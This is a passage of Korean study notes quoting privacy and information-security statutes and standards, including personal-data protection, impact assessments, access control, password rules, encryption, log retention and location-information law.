교도소, 정신보건 시설 등 법령에 근거하여 사람을 구금하거나 보호하는 시설로서 대통령령으로 정하는 시설에 대하여는 그러하지 아니하다.       제1항 각 호에 따라 영상정보기기를 설치,운영하려는 공공기관의 장과 제2항 단서에 따라 영상정보처리기기를 설치,운영하려는 자는 공청회,설명회의 개최 등 대통령령으로 정하는 절차를 거쳐 관계 전문가 및 이해관계인의 의견을 수렴하여야 한다.       제1항 각 호에 따라 영상정보처리기기를 설치,운영하는 자(이하 “영상정보처리기기운영자”라 한다)는 정보주체가 쉽게 인식할 수 있도록 다음 각호의 사항이 포함된 안내판을 설치하는 등 필요한 조치를 하여야 한다. 다만, &lt;군사기지 및 군사시설 보호법&gt; 제2조 제2호에 따른 군사시설, &lt;통합방위법&gt; 제2조 제13호에 따른 국가중요시설, 그 밖에 대통령령으로 정하는 시설에 대하여는 그러하지 아니하다.                    설치 목적 및 장소           촬영 범위 및 시간           관리책임자 성명 및 연락처           그밖에 대통령령으로 정하는 사항                       영상정보처리기기운영자는 영상정보처리기기의 설치 목적과 다른 목적으로 영상정보처리기기를 임의로 조작하거나 다른 곳을 비춰서는 아니 되며, 녹음기능은 사용할 수 없다.           제26조(업무위탁에 따른 개인정보의 처리 제한)            개인정보처리자가 제3자에게 개인정보의 처리 업무를 위탁하는 경우에는 다음 각호의 내용이 포함된 문서에 의하여야 한다.                    위탁업무 수행 목적 외 개인정보의 처리 금지에 관한 상항           개인정보의 기술적,관리적 보호조치에 관한 사항           그 밖에 개인정보의 안전한 관리를 위하여 대통령령으로 정한 사항                       제1항에 따라 개인정보의 처리 업무를 위탁하는 개인정보처리자(이하 “위탁자”라 한다)는 위탁하는 업무의 내용과 개인정보 처리 업무를 위탁받아 처리하는 자(이하 “수탁자”라 한다)를 정보주체가 언제든지 쉽게 확인할 수 있도록 대통령령으로 정하는 방법에 따라 공개하여야 한다.       위탁자가 재화 또는 서비스를 홍보하거나 판매를 권유하는 업무를 위탁하는 경우에는 대통령령으로 정하는 방법에 따라 위탁하는 업무의 내용과 수탁자를 정보주체에게 알려야 한다. 위탁하는 업무의 내용이나 수탁자가 변경된 경우에도 또한 같다.       위탁자는 업무 위탁으로 인하여 정보주체의 개인정보가 분실,도난,유출,위조,변조 또는 훼손되지 아니하도록 수탁자를 교육하고, 처리 현황 점검 등 대통령령으로 정하는 바에 따라 수탁자가 개인정보를 안전하게 처리하는지를 감독하여야 한다.       수탁자는 개인정보처리자로부터 위탁받은 해당 업무 범위를 초과하여 개인정보를 이용하거나 제3자에게 제공하여서는 아니 된다.       수탁자가 위탁받은 업무와 관련하여 개인정보를 처리하는 과정에서 이 법을 위반하여 발생한 손해배상책임에 대하여는 수탁자를 개인정보처리자의 소속 직원으로 본다.           제30조(개인정보 처리방침의 수립 및 공개)            개인정보처리자는 다음 각호의 사항이 포함된 개인정보의 처리 방침(이하 “개인정보 처리방침”이라 한다)을 정하여야 한다. 이 경우 공공기관은 제 32조에 따라 등록대상이 되는 개인정보파일에 대하여 개인정보 처리방침을 정한다.                    개인정보의 처리 목적           개인정보의 처리 및 보유 기간           개인정보의 제3자 제공에 관한 사항(해당되는 경우에만 정한다)           개인정보처리의 위탁에 관한 사항(해당되는 경우에만 정한다)           정보주체와 법정대리인의 권리,의무 및 그 행사 방법에 관한 사항           제31조에 따른 개인정보보호책임자의 성명 또는 개인정보보호업무 및 관련 고충사항을 처리하는 부서의 명칭과 전화번호 등 연락처           인터넷 접속정보파일 등 개인정보를 자동으로 수집하는 장치의 설치,운영 및 그 거부에 관한 사항(해당하는 경우에만 정한다)           그 밖에 개인정보의 처리에 관하여 대통령령으로 정한 사항                       개인정보처리자가 개인정보 처리방침을 수립하거나 변경하는 경우에는 정보주체가 쉽게 확인할 수 있도록 대통령령으로 정하는 방법에 따라 공개하여야 한다.       개인정보 처리방침의 내용과 개인정보처리자와 정보주체 간에 체결한 계약의 내용이 다른 경우에는 정보주체에게 유리한 것을 적용한다.       행정자치부장관은 개인정보 처리방침의 작성지침을 정하여 개인정보처리자에게 그 준수를 권장할 수 있다.           제31조(개인정보보호책임자의 지정)            개인정보처리자는 개인정보의 처리에 관한 업무를 총괄해서 책임질 개인정보보호책임자를 지정하여야 한다.       개인정보보호책임자는 다음 각호의 업무를 수행한다                    개인정보보호 계획의 수립 및 시행           개인정보 처리 실태 및 관행의 정기적인 조사 및 개선           개인정보 처리와 관련한 불만의 처리 및 피해 구제           개인정보 유출 및 오용,남용 방지를 위한 내부통제시스템의 구축           개인정보보호 교육 계획의 수립 및 시행           개인정보파일의 보호 및 관리,감독           그 밖에 개인정보의 적절한 처리를 위하여 대통령령으로 정한 업무                           제32조(개인정보파일의 등록 및 공개)            공공기관의 장이 개인정보파일을 운용하는 경우에는 다음 각호의 사항을 행정자치부장관에게 등록하여야 한다. 등록한 사항이 변경된 경우에도 또한 같다.                    개인정보파일의 명칭           개인정보파일의 운영 근거 및 목적           개인정보파일에 기록되는 개인정보의 항목           개인정보의 처리 방법           개인정보의 보유기간           개인정보를 통상적 또는 반복적으로 제공하는 경우에는 그 제공받는 자           그 밖에 대통령령으로 정하는 사항                           제33조(개인정보 영향평가)            공공기관의 장은 대통령령으로 정하는 기준에 해당하는 개인정보파일의 운용으로 인하여 정보주체의 개인정보 침해가 우려되는 경우에는 그 위험요인의 분석과 개선 사항 도출을 위한 평가(이하 “영향평가”라 한다)를 하고 그 결과를 행정자치부장관에게 제출하여야 한다. 이 경우 공공기관의 장은 영향평가를 행정자치부장관이 지정하는 기관(이하 “평가기관”이라 한다)중에서 의뢰하여야 한다.       영향평가를 하는 경우에는 다음 각호의 사항을 고려하여야 한다.                    처리하는 개인정보의 수           개인정보의 제3자 제공 여부           정보주체의 권리를 해할 가능성 및 그 위험 정도           그 밖에 대통령령으로 정한 사항                       행정자치부장관은 제1항에 따라 제출받은 영향평가 결과에 대하여 보호위원회의 심의,의결을 거쳐 의견을 제시할 수 있다.       공공기관의 장은 제1항에 따라 영향평가를 한 개인정보파일을 제32조 제1항에 따라 등록할 때에는 영향평가 결과를 함께 첨부하여야 한다.       행정자치부장관은 영향평가의 활성화를 위하여 관계 전문가의 육성, 영향평가 기준의 개발,보급 등 필요한 조치를 마련하여야 한다.       제1항에 따른 평가기관의 지정기준 및 지정취소, 평가기준, 영향평가의 방법,절차 등에 관하여 필요한 사항은 대통령령으로 정한다.       국회, 법원, 헌법재판소, 중앙선거관리위원회(그 소속 기관을 포함한다)의 영향평가에 관한 사항은 국회규칙, 대법원규칙, 헌법재판소규칙 및 중앙선거관리위원회규칙으로 정하는 바에 따른다.       공공기관 외의 개인정보처리자는 개인정보파일 운용으로 인하여 정보주체의 개인정보 침해가 우려되는 경우에는 영향평가를 하기 위하여 적극 노력하여야 한다.           3. 개인정보보호법 시행령, 개인정보영향평가 대상     제35조(개인정보 영향평가의 대상) 법 제33조 제1항에서 “대통령령으로 정하는 기준에 해당하는 개인정보파일”이란 개인정보를 전자적으로 처리할 수 있는 개인정보파일로서 다음 각호의 어느 하나에 해당하는 개인정보파일을 말한다.            구축,운용 또는 변경하려는 개인정보파일로서 5만 명 이상의 정보주체에 관한 민감정보 또는 고유식별정보의 처리가 수반되는 개인정보파일       구축,운용하고 있는 개인정보파일을 해당 공공기관 내부 또는 외부에서 구축,운용하고 있는 다른 개인정보파일과 연계하려는 경우로서 연계 결과 50만 명 이상의 정보주체에 관한 개인정보가 포함되는 개인정보파일       구축,운용 또는 변경하려는 개인정보파일로서 100만 명 이상의 정보주체에 관한 개인정보파일       법 제33조 제1항에 따른 개인정보 영향평가(이하 “영향평가”라 한다)를 받은 후에 개인정보 검색체계 등 개인정보파일의 운용체계를 변경하려는 경우 그 개인정보파일. 이 경우 영향평가 대상은 변경된 부분으로 한정한다.           제39조(손해배상책임)            정보주체는 개인정보처리자가 이 법을 위반한 행위로 손해를 입으면 개인정보처리자에게 손해배상을 청구할 수 있다. 이 경우 그 개인정보처리자는 고의 또는 과실이 없음을 입증하지 아니하면 책임을 면할 수 없다.       개인정보처리자의 고의 또는 중대한 과실로 인하여 개인정보가 분실,도난,유출,위조,변조 또는 훼손된 경우로서 정보주체에게 손해가 발생한 때에는 법원은 그 손해액의 3배를 넘지 아니하는 범위에서 손해배상액을 정할 수 있다. 다만, 개인정보처리자가 고의 또는 중대한 과실이 없음을 증명한 경우에는 그러하지 아니하다.       법원은 제3항의 배상액을 정할 때에는 다음 각호의 사항을 고려하여야 한다.                    고의 또는 손해 발생의 우려를 인식한 정도           위반행위로 인하여 입은 피해 규모           위법행위로 인하여 개인정보처리자가 취득한 경제적 이익           위반행위에 따른 벌금 및 과징금           위반행위의 기간,횟수 등           개인정보처리자의 재산상태           개인정보처리자가 정보주체의 개인정보 분실,도난,유출 후 해당개인정보를 회수하기 위하여 노력한 정도           개인정보처리자가 정보주체의 피해구제를 위하여 노력한 정도                           3. 정보통신기반 보호법(시행령)     제9조(정보보호책임자의 지정 등)            법 제5조 제4항 본문에 따라 관리기관의 장은 소관 주요정보통신기반시설의 보호 업무를 담당하는 4급,4급 상당 공무원, 5급,5급 상당 공무원, 영관급장교 또는 임원급 관리,운영자를 정보보호책임자로 지정하여야 한다.           제17조(취약점 분석,평가의 시기)            관리기관의 장은 소관 정보통신기반시설이 주요정보통신기반시설로 지정된 때에는 지정 후 6월 이내에 법 제9조 제1항의 규정에 의한 취약점의 분석,평가를 실시하여야 한다. 다만, 관리기관의 장은 소관 주요정보통신기반시설 지정 후 6월 이내에 동 시설에 대한 취약점의 분석,평가를 시행하지 못할 특별한 사유가 있다고 판단되는 경우에는 관할 중앙행정기관의 장의 승인을 얻어 지정 후 9월 이내에 이를 실시하여야 한다.       관리기관의 장은 제1항에 따라 소관 주요정보통신기반시서리 지정된 후 당해 주요정보통신기반시설에 대한 최초의 취약점 분석,평가를 한 후에는 매년 취약점의 분석,평가를 실시한다. 다만, 소관 주요정보통신기반시설에 중대한 변화가 발생하였거나 관리기관의 장이 취약점 분석,평가가 필요하다고 판단하는 경우에는 1년이 되지 아니한 때에도 취약점의 분석,평가를 실시할 수 있다.           제18조(취약점 분석,평가 방법 및 절차)            법 제9조 제4항의 규정에 의한 취약점 분석,평가 기준에는 다음 각호의 사항이 포함되어야 한다.                    취약점 분석,평가의 절차           취약점 분석,평가의 범위 및 항목           취약점 분석,평가의 방법                           제21조(침해사고의 통지)            법 제13조 제1항 전단의 규정에 의한 침해사고의 통지에는 다음 각호의 사항이 포함되어야 한다.                    침해사고발생 일시 및 시설           침해사고로 인한 피해내역           기타 신속한 대응,복구를 위하여 필요한 사항                           개인정보보호 관련 용어 정의     정보주체            처리되는 정보에 의하여 알아볼 수 있는 사람으로서 그 정보의 주체가 되는 사람       법인이나 단체가 아닌 살아있는 사람           개인정보파일            개인정보를 쉽게 검색할 수 있도록 일정한 규칙에 따라 체계적으로 배열하거나 구성한 개인정보의 집합물       데이터베이스, 컴퓨터의 문서파일, 수기문서 자료 포함           개인정보처리자            업무를 목적으로 개인정보파일을 운용하기 위하여 스스로 또는 다른 사람을 통하여 개인정보를 처리하는 공공기관, 법인, 단체 및 개인 등           개인정보취급자            개인정보취급자의 용어 정의 비교                    개인정보취급자는 개인정보 처리 업무를 담당하고 있는 자라면 정규직, 비정규직, 파견직, 시간제 등 모든 근로형태를 불문한다.           고용관계가 없더라도 실질적으로 개인정보 처리자의 지휘,감독을 받아 개인정보를 처리하는 자는 개인정보취급자에 포함된다.                           개인정보보호 관련 법제  1. 개인정보 안전성 확보조치  1. 개인정보의 안전성 확보조치     제1조(목적) 이 기준은 ~ 중략 ~ 따라 개인정보처리자가 개인정보를 처리함에 있어서 개인정보가 분실,도난,유출,위조,변조 또는 훼손되지 아니하도록 안전성 확보에 필요한 기술적,관리적 및 물리적 안전조치에 관한 최소한의 기준을 정하는 것을 목적으로 한다.   2. 접근권한의 관리     접근권한의 부여            업무 수행에 필요한 최소한의 범위로 업무 담당자에 따라 차등 부여해야 한다.       접근권한의 차등 방법 예시                    권한부여 대상 : 개인별, 그룹별, 조직별, 역할별 등           권한유형 : 조회, 입력, 변경, 삭제, 출력, 다운로드, 권한관리 등                           개인정보의 안전성 확보조치 기준 제5조            개인정보처리자는 개인정보처리시스템에 대한 접근 권한을 업무 수행에 필요한 최소한의 범위로 업무 담당자에 따라 차등 부여하여야 한다.       개인정보처리자는 전보 또는 퇴직 등 인사이동이 발생하여 개인정보취급자가 변경되었을 경우 지체없이 개인정보처리 시스템의 접근 권한을 변경 또는 말소하여야 한다.       개인정보처리자는 제1항 및 제2항에 의한 권한 부여, 변경 또는 말소에 대한 내역을 기록하고, 그 기록을 최소 3년간 보관하여야 한다.       개인정보처리자는 개인정보처리시스템에 접속할 수 있는 사용자계정을 발급하는 경우 개인정보취급자 별로 사용자 계정을 발급하여야 하며, 다른 개인정보취급자와 공유되지 않도록 하여야 한다.       개인정보처리자는 개인정보취급자 또는 정보주체가 안전한 비밀번호를 설정하여 이행할 수 있도록 비밀번호 작성규칙을 수립하여 적용하여야 한다.       개인정보처리자는 권한 있는 개인정보취급자만이 개인정보 처리시스템에 접근할 수 있도록 계정정보 또는 비밀번호를 일정 횟수 이상 잘못 입력한 경우 개인정보 처리시스템에 대한 접근을 제한하는 등 필요한 기술적 조치를 하여야 한다.                의 유형1에 해당하는 개인정보처리자는 제1항 및 제6항을 아니할 수 있다.                   접근권한의 변경 또는 말소            전보, 퇴직 등 인사이동이 발생하여 개인정보취급자가 변경되었을 경우 지체 없이 개인정보처리시스템의 접근권한을 변경 또는 말소하여야 한다.           개인정보취급자 권한변경 내역의 기록 및 보관            개인정보처리시스템의 접근권한을 부여,변경 또는 말소한 내역은 책임추적성을 확보할 수 있도록 관련 사항이 모두 포함되어 기록되어야 한다.       개인정보의 안전성 확보조치 기준(개인정보보호법) : 최소 3년간       개인정보의 기술적,관리적 보호조치 기준(정보통신망법) : 최소 5년(정보통신서비스제공자)           개인정보처리시스템 사용자 계정            개인정보취급자 별로 별도 발급하고 공유되지 않도록 한다.       각 개인정보 취급자별 개인정보처리내역에 대한 책임 추적성(Accountability)을 확보하여야 한다.           비밀번호 작성규칙 적용            비밀번호는 문자, 숫자의 조합으로 최소 8자리 또는 10자리 이상의 길이로 구성한다.                    최소 8자리 이상 : 두 종류 이상의 문자를 이용하여 구성한 경우(문자 종류 : 알파벳 대문자와 소문자, 특수문자, 숫자)           최소 10자리 이상 : 하나의 문자 종류로 구성한 경우(단, 숫자로만 구성할 경우 취약할 수 있음) -&gt; 비밀번호는 추측하거나 유추하기 어렵도록 설정           동일한 문자 반복(aaabbb, 123123 등), 키보드상에서 나란히 있는 문자열(qwer 등), 일련번호(12345678 등), 가족이름, 생일, 전화번호 등은 사용하지 않는다.                       비밀번호가 제3자에게 노출되었을 경우 지체 없이 새로운 비밀번호로 변경해야 한다.           접근통제            개인정보의 안전성 확보조치 기준 제6조 (접근통제)                    정보처리자는 정보통신망을 통한 불법적인 접근 및 침해사고방지를 위해 다음 각호의 기능을 포함한 조치를 하여야 한다.                            개인정보처리시스템에 대한 접속 권한IP(Internet Protocol)주소 등으로 제한하여 인가받지 않은 접근을 제한               개인정보처리시스템에 접속한 IP(Internet Protocol)주소 등을 분석하여 불법적인 개인정보 유출 시도 탐지 및 대응                                   개인정보처리자는 개인정보취급자가 정보통신망을 통해 외부에서 개인정보처리시스템에 접속하려는 경우 가살사설망(VPN : Virtual Private Network) 또는 전용선 등 안전한 접속수단을 적용하거나 안전한 인증수단을 적용하여야 한다.           개인정보처리자는 취급 중인 개인정보가 인터넷 홈페이지, P2P, 공유설정, 공개된 무선망 이용 등을 통하여 열람권한이 없는 자에게 공개되거나 유출되지 않도록 개인정보처리를 시스템, 업무용 컴퓨터, 모바일 기기 및 관리용 단말기 등의 접근 통제 등에 관한 조치를 하여야한다.           고유식별정보를 처리하는 개인정보처리자는 인터넷 홈페이지를 통해 고유식별정보가 유출,변조,훼손되지 않도록 연 1회 이상 취약저믈 점검하고 필요한 보완 조치를 하여야 한다.           개인정보처리자는 개인정보처리시스템에 대한 불법적인 접근 및 침해사고 방지를 위하여 개인정보취급자가 일정시간 이상 업무처리를 하지 않은 경우에는 자동으로 시스템 접속이 차단되도록 하여야 한다.           개인정보처리자가 별도의 개인정보처리시스템을 이용하지 아니하고 업무용 컴퓨터 또느 모바일 기기를 이용하여 개인정보를 처리하는 경우에는 제1항을 적용하지 아니할 수 있으며, 이 경우 업무용 컴퓨터 또는 모바일 기기의 운영체제(OS : Operating System)나 보안 프로그램 등에서 제공하는 접근 통제 기능을 이용할 수 있다.           개인정보처리자는 업무용 모바일 기기의 분실,도난 등으로 개인정보가 유출되지 않도록 해당 모바일 기기에 비밀번호 설정 등의 보호조치를 하여야 한다.                        의 유형1에 해당하는 개인정보처리자는 제2항, 제4항부터 제5항까지의 조치를 아니할 수 있다.                                   개인정보의 안전성 확보조치 기준 제7조 (개인정보의 암호화)                    개인정보처리자는 고유식별정보, 비밀번호, 바이오정보를 정보통신망을 통하여 송신하거나 보조저장매체 등을 통하여 전달하는 경우에는 이를 암호화하여야 한다.           개인정보처리자는 비밀번호 및 바이오정보는 암호화하여 저장하여야 한다. 다만, 비밀번호를 저장하는 경우에는 복호화되지 아니하도록 일방향 암호화하여 저장하여야 한다.           개인정보처리자는 인터넷 구간 및 인터넷 구간과 내부망의 중간 지점(DMZ: Demilitarized Zone)에 고유식별정보를 저장하는 경우에는 이를 암호화하여야 한다.           개인정보처리자가 내부망에 고유식별정보를 저장하는 경우에는 다음 각호의 기준에 따라 암호화의 적용여부 및 적용 범위를 정하여 시행할 수 있다.                            법 제33조에 따른 개인정보 영향평가의 대상이 되는 공공기관의 경우에는 해당 개인정보 영향평가의 결과               암호화 미적용 시 위험도 분석에 따른 결과                                   1부칙 제2조(적용례) 영 제21조의 2제 2항에 따른 주민등록번호의 암호화 적용 시기 이후에는 고유식별정보 중 주민등록번호는 제7조 제4항을 적용하지 아니 한다.           개인정보처리자는 제1항, 제2항, 제3항, 또는 제4항에 따라 개인정보를 암호화하는 경우 안전한 암호알고리즘으로 암호화하여 저장하여야 한다.           개인정보처리자는 암호화된 개인정보를 안전하게 보관하기 위하여 안전한 암호 키 생성,이용,보관,배포 및 파기 등에 관한 절차를 수립,시행하여야 한다.           개인정보처리자는 업무용 컴퓨터 또는 모바일 기기에 고유식별정보를 저장하여 관리하는 경우 상용 암호화 소프트웨어 또는 안전한 암호화 알고리즘을 사용하여 암호화한 후 저장하여야 한다.                        의 유형1 및 유형2에 해당하는 개인정보처리자는 제6항을 아니할 수 있다.                                            개인정보의 안전성 확보조치 기준에 따른 암호화 대상 및 적용기준                                                  구분               암호화 대상               적용기준                                                               정보통신망, 보조저장매체를 통한 송신 시               비밀번호, 바이오정보, 고유식별정보               암호화 송신                                         개인정보처리시스템에 저장 시               비밀번호               일방향(해시 함수) 암호화 저장                                                         바이오정보               암호화 저장                                                         (고유식별정보)주민등록번호               암호화 저장                                                         (고유식별정보)여권번호, 외국인등록번호, 운전면허정보               암호화 적용여부,적용범위를 정하여 시행 ⦁ 개인정보 영향평가 대상이 되는 공공 기관의 경우, 그 개인정보 영향평가의 결과 ⦁ 암호화 미적용 시 위험도 분석에 따른 결과                                         업무용 컴퓨터, 모바일기기에 저장 시               비밀번호, 바이오정보, 고유식별정보               암호화 저장(비밀번호는 일방향저장)                                                   접속기록의 보관 및 점검                     접속기록의 보관 및 점검(접속기록의 위,변조 방지) 비교                                                  구분               개인정보의 안전성 확보조치 기준 (개인정보보호법)               개인정보의 기술적,관리적 보호조치 기준 (정보통신망법)                                                               접속기록의 보관               ⦁ 1년 이상 보관,관리, 5만 명 이상의 정보주체에 관하여 개인정보를 처리하거나 고유식별자 또는 민감 정보를 정리하는 개인정보시스템의 경우 2년 이상 보관관리 ⦁ 개인정보를 다운로드한 것이 발견 되었을 경우에는 내부관리 계획으로 정하는 바에 따라 그 사유를 반드시 확인해야 함               최소 6개월 이상 보관,관리(기간통신사업자 최소2년)                                         접속기록의 점검               월 1회 이상 점검               월 1회 이상 정기적 확인,감독                                                   악성 프로그램 등 방지            개인정보의 안전성 확보조치 기준 제9조(악성프로그램 등 방지)                    개인정보 처리자는 악성프로그램 등을 방지,치료할 수 있는 백신 소프트웨어 등의 보안프로그램을 설치,운영하여야 하며, 다음 각호의 사항을 준수하여야 한다.                            보안 프로그램의 자동 업데이트 기능을 사용하거나, 일 1회 이상 업데이트를 실시하여 최신의 상태로 유지               악성프로그램 관련 경보가 발령된 경우 또는 사용중인 응용 프로그램이나 운영체제 소프트웨어의 제작업체에서 보안 업데이트 공지가 있는 경우 즉시 이에 따른 업데이트를 실시               발견된 악성프로그램 등에 대해 삭제 등 대응 조치                                                   관리용 단말기 안전조치            개인정보 안전성 확보조치 기준 제10조(관리용 단말기의 안전조치)                    개인정보처리자는 개인정보유출 등 개인정보 침해사고 방지를 위하여 관리용 단말기에 대해 다음 각호의 안전조치를 하여야 한다.                            인가받지 않은 사람이 관리용 단말기에 접근하여 임의로 조작하지 못하도록 조치               본래 목적 외로 사용되지 않도록 조치               악성프로그램 감염 방지 등을 위한 보안조치 적용                                                   물리적 안전조치            개인정보의 안전성 확보조치 기준 제11조(물리적 안전조치)                    개인정보처리자는 전산실, 자료보관실 등 개인정보를 보관하고 있는 물리적 보관 장소를 별도로 두고 있는 경우에는 이에 대한 출입통제 절차를 수립,운영하여야 한다.           개인정보처리자는 개인정보가 포함된 서류,보조저장매체 등을 잠금장치가 있는 안전한 장소에 보관하여야 한다.           개인정보처리자는 개인정보가 포함된 보조저장매체의 반출,입 통제를 위한 보안 대책을 마련하여야 한다. 다만, 별도의 개인정보처리시스템을 운영하지 아니하고 업무용 컴퓨터 또는 모바일 기기를 이용하여 개인정보를 처리하는 경우에는 이를 적용하지 아니할 수 있다.                           재해, 재난대비 안전조치            개인정보의 안전성 확보조치 기준 제12조(재해, 재난대비 안전조치)                    개인정보처리자는 화재, 홍수, 단전 등의 재해,재난 발생 시 개인정보처리시스템 보호를 위한 위기대응 매뉴얼 등 대응 절차를 마련하고 정기적으로 점검하여야 한다.           개인정보처리자는 재해,재난 발생 시 개인정보처리시스템 백업 및 복구를 위한 계획을 마련하여야 한다.                        의 유형1 및 유형2에 해당하는 개인정보처리자는 제1항부터 제2항까지 조치를 이행하지 아니할 수 있다.                                       개인정보 파기            개인정보의 안전성 확보조치 기준 제13조(개인정보의 파기)                    개인정보처리자는 개인정보를 파기할 경우 다음 각호 중 어느 하나의 조치를 하여야 한다.                            완전파괴(소각,파쇄 등)               전용 소자장비를 이용하여 삭제               데이터가 복원되지 않도록 초기화 또는 덮어쓰기 수행                                   개인정보처리자가 개인정보의 일부만을 파기하는 경우, 제1항의 방법으로 파기하는 것이 어려울 때는 다음 각호의 조치를 하여야 한다.                            전자적 파일 형태인 경우 : 개인정보를 삭제한 후 복구 및 재생되지 않도록 관리 및 감독               제1호 외의 기록물, 인쇄물, 서면, 그 밖의 기록매체인 경우 : 해당 부분을 마스킹, 천공 등으로 삭제                                               개인정보처리자는 보유기관의 경과, 개인정보의 처리목적 달성 등 개인정보가 불필요하게 되었을 때는 지체 없이 그 개인정보를 파기하여야 한다.           2. 위치정보의 보호 및 이용 등에 관한 법률     제15조(위치정보의 수집 등의 금지)            누구든지 개인 또는 소유자의 동의를 얻지 아니하고 당해 개인 또는 이동성이 있는 물건의 위치정보를 수집,이용 또는 제공하여서는 아니된다. 다만, 다음 각호의 어느 하나에 해당하는 경우에는 그러하지 아니하다.                    제29조제1항에 따른 긴급구조기관의 긴급구조요청 또는 같은 조 제7항에 따른 정보발송요청이 있는 경우           제29조제2항에 따른 경찰관서의 요청이 있는 경우           다른 법률에 특별한 규정이 있는 경우                       누구든지 타인의 정보통신기기를 복제하거나 정보를 도용하는 등의 방법으로 위치정보사업자등을 속여 타인의 개인위치정보를 제공받아서는 아니된다.       위치정보를 수집할 수 있는 장치가 부착된 물건을 대여하는 자는 위치정보 수집장치가 부착된 사실을 대여받은자에게 고지하여야 한다.           제16조(위치정보의 보호조치 등)            위치정보사업자등은 위치정보의 누출, 변조, 훼손 등을 방지하기 위하여 위치정보의 취급,관리 지침을 제정하거나 접근권한자를 지정하는 등의 관리적 조치와 방화벽의 설치나 암호화 소프트웨어의 활용 등의 기술적 조치를 하여야 한다. 이 경우 관리적 조치와 기술적 조치의 구체적 내용은 대통령령으로 정한다.       위치정보사업자등은 위치정보 수집,이용,제공사실 확인자료를 위치정보시스템에 자동으로 기록되고 보존되도록 하여야 한다.       방송통신위원회는 위치정보를 보호하고 오용,남용을 방지하기 위하여 소속 공무원으로 하여금 제1항의 규정에 의한 기술적,관리적 조치의 내용과 제2항의 규정에 의한 기록의 보존실태를 대통령령이 정하는 바에 의하여 점검하게 할 수 있다. 3항에 따라 기술적,관리적 조치의 내용과 기록의 보존실태를 점검하는 공무원은 그 권한을 표시하는 증표를 지니고 이를 관계인에게 내보여야 한다.           제18조(개인위치정보의 수집)            위치정보사업자가 개인위치정보를 수집하고자 하는 경우에는 미리 다음 각호의 내용을 이용약관에 명시한 후 개인위치정보주체의 동의를 얻어야 한다.                    위치정보사업자의 상호, 주소, 전화번호 그 밖의 연락처           개인위치정보주체 및 법정대리인(제25조제1항의 규정에 의하여 법정대리인의 동의를 얻어야 하는 경우로 한정한다)의 권리와 그 행사 방법           위치정보사업자가 위치기반서비스사업자에게 제공하고자 하는 서비스의 내용           위치정보 수집사실 확인자료의 보유근거 및 보유기간           그 밖에 개인위치정보의 보호를 위하여 필요한 사항으로서 대통령령이 정하는 사항                       개인위치정보주체는 제1항의 규정에 의한 동의를 하는 경우 개인위치정보의 수집의 범위 및 이용약관의 내용 중 일부에 대하여 동의를 유보할 수 있다.       위치정보사업자가 개인위치정보를 수집하는 경우에는 수집목적을 달성하기 위하여 필요한 최소한의 정보를 수집하여야 한다.           제19조(개인위치정보의 이용 또는 제공)            위치기반서비스사업자가 개인위치정보를 이용하여 서비스를 제공하고자 하는 경우에는 미리 다음 각호의 내용을 이용약관에 명시한 후 개인위치정보주체의 동의를 얻어야 한다.                    위치기반서비스사업자의 상호, 주소, 전화번호 그 밖의 연락처           개인위치정보주체 및 법정대리인(제25조제1항의 규정에 의하여 법정대리인의 동의를 얻어야 하는 경우로 한정한다)의 권리와 그 행사 방법           위치기반서비스사업자가 제공하고자 하는 위치기반서비스의 내용           위치정보 이용,제공사실 확인자료의 보유근거 및 보유기간           그 밖에 개인위치정보의 보호를 위하여 필요한 사항으로서 대통령령이 정하는 사항                       위치기반서비스사업자가 개인위치정보를 개인위치정보주체가 지정하는 제3자에게 제공하는 서비스를 하고자 하는 경우에는 제1항 각호의 내용을 이용약관에 명시한 후 제공받는 자 및 제공목적을 개인위치정보주체에게 고지하고 동의를 얻어야 한다.       제2항의 규정에 의하여 위치기반서비스사업자가 개인위치정보를 개인위치정보주체가 지정하는 제3자에게 제공하는 경우에는 매회 개인위치정보주체에게 제공받는 자, 제공일시 및 제공목적을 즉시 통보하여야 한다.       위치기반서비스사업자는 제3항에도 불구하고 대통령령으로 정하는 바에 따라 개인위치정보주체의 동의를 받은 경우에는 최대 30일의 범위에서 대통령령으로 정하는 횟수 또는 기간 등의 기준에 따라 모아서 통보할 수 있다. 인위치정보주체는 제1항,제2항 및 제4항에 따란 동의를 하는 경우 개인위치정보의 이용,제공목적, 제공받는자의 범위 및 위치기반서비스의 일부와 개인위치정보주체에 대한 통보 방법에 대하여 동의를 유보할 수 있다.           제21조(개인위치정보 등의 이용,제공의 제한 등)            위치정보사업자등은 개인위치정보주체의 동의가 있거나 다음 각호의 어느 하나에 해당하는 경우를 제외하고는 개인위치정보 또는 위치정보 수집,이용,제공사실 확인자료를 제18조 제1항 및 제19조 제1항,제2항에 의하여 이용약관에 명시 또는 고지한 범위를 넘어 이용하거나 제3자에게 제공하여서는 아니된다.                    위치정보 및 위치기반서비스 등의 제공에 따른 요금정산을 위하여 위치정보 수집,이용,제공사실 확인자료가 필요한 경우           통계작성, 학술연구 또는 시장조사를 위하여 특정 개인을 알아볼 수 없는 형태로 가공하여 제공하는 경우                           제24조(개인위치정보주체의 권리 등)            개인위치정보주체는 위치정보사업자등에 대하여 언제든지 제18조제1항 및 제19조제1항,제2항,제4항에 따른 동의의 전부 또는 일부를 철회할 수 있다.       개인위치정보주체는 위치정보사업자등에 대하여 언제든지 개인위치정보의 수집, 이용 또는 제공의 일시적인 중지를 요구할 수 있다. 이 경우 위치정보사업자등은 요구를 거절하여서는 아니되며, 이를 위한 기술적 수단을 갖추어야한다.       개인위치정보주체는 위치정보사업자등에 대하여 다음 각호의 어느 하나에 해당하는 자료 등의 열람 또는 고지를 요구할 수 있고, 해당 자료 등에 오류가 있는 경우에는 그 정정을 요구할 수 있다. 이 경우 위치정보사업자등은 정당한 사유없이 요구를 거절하여서는 아니된다.                    본인에 대한 위치정보 수집,이용,제공사실 확인자료           본인의 개인위치정보가 이 법 또는 다른 법률의 규정에 의하여 제3자에게 제공된 이유 및 내용                       위치정보사업자등은 개인위치정보주체가 제1항의 규정에 의하여 동의의 전부 또는 일부를 철회한 경우에는 지체없이 수집된 개인위치정보 및 위치정보 수집,이용,제공사실 확인자료(동의의 일부를 철회하는 경우에는 철회하는 부분의 개인위치정보 및 위치정보 이용,제공사실 확인자료로 한정한다)를 파기하여야 한다.           제25조(법정대리인의 권리)            위치정보사업자등이 14세 미만의 아동으로부터 제18조 제1항, 제19조 제1항,제2항 또는 제21조의 규정에 의하여 개인위치정보를 수집,이용 또는 제공하고자 하는 경우에는 그 법정대리인의 동의를 얻어야 한다.           제26조(8세 이하의 아동등의 보호를 위한 위치정보 이용)            다음 각호의 어느 하나에 해당하는 사람(이하 “8세 이하의 아동등”이라 한다)의 